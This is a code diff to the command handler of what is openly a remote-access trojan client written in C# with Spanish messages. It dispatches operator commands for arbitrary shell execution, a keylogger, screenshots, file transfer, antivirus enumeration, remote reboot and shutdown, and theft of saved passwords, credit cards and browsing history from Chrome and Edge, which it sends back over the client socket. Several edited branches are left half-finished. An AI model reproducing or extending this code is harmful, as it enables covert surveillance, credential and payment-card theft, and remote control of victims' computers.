@@ -1,8 +1,9 @@
-﻿using Client.Conexion;
+﻿using System.Diagnostics;
+using System.Text;
+using Client.Conexion;
 using Client.Stealers;
 using Client.Util;
-using System.Diagnostics;
-using System.Text;
+using static System.Runtime.InteropServices.JavaScript.JSType;
 
 
 namespace Client.Commands
@@ -50,87 +51,102 @@ namespace Client.Commands
             }
         }
 
-        public static async Task<string> ProcessCommandAsync(string command)
+        public static async Task ProcessCommandAsync(string command)
         {
-            string response = "";
+            var stream = ClientSocket.getClientStream();
+
+            if (string.IsNullOrWhiteSpace(command))
+            {
+                // Envía un mensaje vacío o de error
+                var empty = Encoding.UTF8.GetBytes("[ERROR] Comando vacío\n");
+                Protocol.Send(stream, Channel.CommandOutput, empty);
+                return;
+            }
 
             if (command.StartsWith("exec"))
             {
-                response = "CMDOUT:"+HandleCommands.ExecuteCommand(command.Substring(5));
+                string result = ExecuteCommand(command.Substring(5));
+                ClientSocket.SendResponse(result, Channel.CommandOutput);
+                return;
             }
             else if (command == "keylogger")
             {
-                Keylogger.start();
+                Keylogger.Start();
             }
             else if (command == "keylogger stop")
             {
-                Keylogger.stop();
+                Keylogger.Stop();
             }
             else if (command == "list_processes")
             {
-                response = Functions.ListProcesses();
+               string response = Functions.ListProcesses();
             }
             else if (command.StartsWith("get "))
             {
                 string fileName = command.Substring(4).Trim();
-                response = "";
                 ClientSocket.SendFile(fileName);
+                return;
             }
             else if (command == "browsers")
             {
-                response = Functions.ListInstalledBrowsers();
+                string  response = Functions.ListInstalledBrowsers();
             }
             else if (command == "reboot")
             {
-                response = HandleCommands.ExecuteCommand("shutdown /r /t 1");
+                string response = HandleCommands.ExecuteCommand("shutdown /r /t 1");
             }
             else if (command == "shutdown")
             {
-                response = HandleCommands.ExecuteCommand("shutdown /s");
+                string response = HandleCommands.ExecuteCommand("shutdown /s");
             }
             else if (command == "antivirus")
             {
-                response = Functions.ListInstalledAntivirus();
+                string response = Functions.ListInstalledAntivirus();
             }
             else if (command == "network_info")
             {
-                response = await SystemInfo.GetNetworkInfo();
+                string response = await SystemInfo.GetNetworkInfo();
             }
             else if (command == "system_info")
             {
-                response = await SystemInfo.GetSystemInfo();
+                string sysinfo= await SystemInfo.GetSystemInfo();
+                var data = Encoding.UTF8.GetBytes(sysinfo);
+                Protocol.Send(stream, Channel.SystemInfo, data);
+                return;
             }
             else if (command == "screenshot")
             {
                 string timestamp = DateTime.Now.ToString("yyyyMMdd-HHmmss");
                 string filename = $"infiltrator-{timestamp}-screenshot.png";
-                Screenshot.CaptureScreen(filename);
-                ClientSocket.SendFile(filename);
+                
+                //Protocol.Send(stream, Channel.Screenshot, Screenshot.CaptureScreen(filename));
                 File.Delete(filename);
-                response = "";
+                
             }
             else if (command == "disconnect")
             {
-                response = "";
+                
                 ClientSocket.setConnected(false);
+                return;
             }
             else if (command.StartsWith("kill "))
             {
                 int pid;
+                string killPID;
                 if (int.TryParse(command.Substring(5), out pid))
                 {
-                    response = Functions.KillProcess(pid);
+                    killPID = Functions.KillProcess(pid);
                 }
                 else
                 {
-                    response = "Formato de comando 'kill' incorrecto. Uso: kill PID";
+                    killPID = "Formato de comando 'kill' incorrecto. Uso: kill PID";
                 }
             }
             else if (command.StartsWith("sendfile "))
             {
                 string fileName = command.Substring(9).Trim();
                 ClientSocket.ReceiveFile(fileName);
-                response = $"Archivo {fileName} recibido correctamente.";
+                string response = $"Archivo {fileName} recibido correctamente.";
             }
             else if (command == "chrome_passwords")
             {
@@ -141,11 +157,11 @@ namespace Client.Commands
                 {
                     ClientSocket.SendFile("chrome_passwords.csv");
                     File.Delete("chrome_passwords.csv");
-                    response = "";
+                    string response = "";
                 }
                 else
                 {
-                    response = "Error al intentar obtener las credenciales de Chrome";
+                    string response = "Error al intentar obtener las credenciales de Chrome";
                 }
 
                 
@@ -159,11 +175,11 @@ namespace Client.Commands
                 {
                     ClientSocket.SendFile("chrome_ccs.csv");
                     File.Delete("chrome_ccs.csv");
-                    response = "";
+                    string response = "";
                 }
                 else
                 {
-                    response = "Error al intentar obtener las tarjetas de crédito de Chrome";
+                    string response = "Error al intentar obtener las tarjetas de crédito de Chrome";
                 }
             }
             else if (command == "chrome_history")
@@ -175,11 +191,11 @@ namespace Client.Commands
                 {
                     ClientSocket.SendFile("chrome_history.csv");
                     File.Delete("chrome_history.csv");
-                    response = "";
+                    return;
                 }
                 else
                 {
-                    response = "Error al intentar obtener el historial de Chrome";
+                    string response = "Error al intentar obtener el historial de Chrome";
                 }
             }
             else if (command == "edge_passwords")
@@ -192,11 +208,11 @@ namespace Client.Commands
                     ClientSocket.SendFile("edge_passwords.csv");
                     File.Delete("edge_passwords.csv");
 
-                    response = "";
+                    return;
                 }
                 else
                 {
-                    response = "Error al intentar obtener las credenciales de Edge";
+                   string response = "Error al intentar obtener las credenciales de Edge";
                 }
 
 
@@ -210,11 +226,11 @@ namespace Client.Commands
                 {
                     ClientSocket.SendFile("edge_ccs.csv");
                     File.Delete("edge_ccs.csv");
-                    response = "";
+                    return;
                 }
                 else
                 {
-                    response = "Error al intentar obtener las tarjetas de crédito de Edge";
+                    string response = "Error al intentar obtener las tarjetas de crédito de Edge";
                 }
             }
             else if (command == "edge_history")
@@ -226,19 +242,19 @@ namespace Client.Commands
                 {
                     ClientSocket.SendFile("edge_history.csv");
                     File.Delete("edge_history.csv");
-                    response = "";
+                    return;
                 }
                 else
                 {
-                    response = "Error al intentar obtener el historial de Edge";
+                   string response = "Error al intentar obtener el historial de Edge";
                 }
             }
             else
             {
-                response = "Comando no reconocido.";
+               string response = "Comando no reconocido.";
             }
 
-            return response;
+            
         }
 
 
